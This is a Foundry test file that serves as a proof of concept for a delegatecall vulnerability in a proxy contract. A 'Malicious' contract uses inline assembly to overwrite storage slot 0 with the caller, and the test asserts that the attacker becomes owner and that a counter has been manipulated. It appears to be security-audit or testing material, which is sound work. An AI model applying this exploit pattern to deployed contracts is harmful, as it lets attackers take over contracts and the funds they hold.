// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/proxy.sol";

contract Malicious {
    function exploit() public {
        assembly {
            // Set new owner at slot0
            sstore(0, caller())
            // Preset totalTransactions to 999 at slot1
            sstore(1, 999)
        }
    }
}

contract ProxyTest is Test {
    Proxy public proxy;
    Malicious public maliciousContract;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy vulnerable proxy contract
        vm.prank(owner);
        proxy = new Proxy();
        
        // Deploy malicious contract
        maliciousContract = new Malicious();
    }

    function testDelegateCallExploit() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 totalTxBefore = proxy.totalTransactions();
        uint256 userStatsBefore = proxy.getUserStats(attacker);
        console.log("TotalTransactions before:", totalTxBefore);
        console.log("Attacker TX stats before:", userStatsBefore);

        console.log("--- Trigger Exploit ---");
        // Execute attack
        vm.prank(attacker);
        proxy.forward(
            address(maliciousContract), 
            abi.encodeWithSignature("exploit()")
        );

        console.log("--- AFTER-Trigger State ---");
        uint256 totalTxAfter = proxy.totalTransactions();
        uint256 userStatsAfter = proxy.getUserStats(attacker);
        console.log("TotalTransactions after:", totalTxAfter);
        console.log("Attacker TX stats after:", userStatsAfter);

        // Check if state changed as expected
        bool stateManipulated = (totalTxAfter == 1000 && userStatsAfter == 1);
        if (stateManipulated) {
            console.log("Vulnerability Exists: Exploit changed contract state");
        } else {
            console.log("Vulnerability not Exist: State unchanged by exploit");
        }

        // Following original low-level verification
        bytes32 newOwner = vm.load(address(proxy), bytes32(uint256(0)));
        bytes32 newTotalTx = vm.load(address(proxy), bytes32(uint256(1)));
        assertEq(newOwner, bytes32(uint256(uint160(attacker))), "Owner changed to attacker");
        assertEq(newTotalTx, bytes32(uint256(1000)), "totalTransactions manipulated to 1000");
        assertEq(userStatsAfter, 1, "User transaction count incremented");
    }
}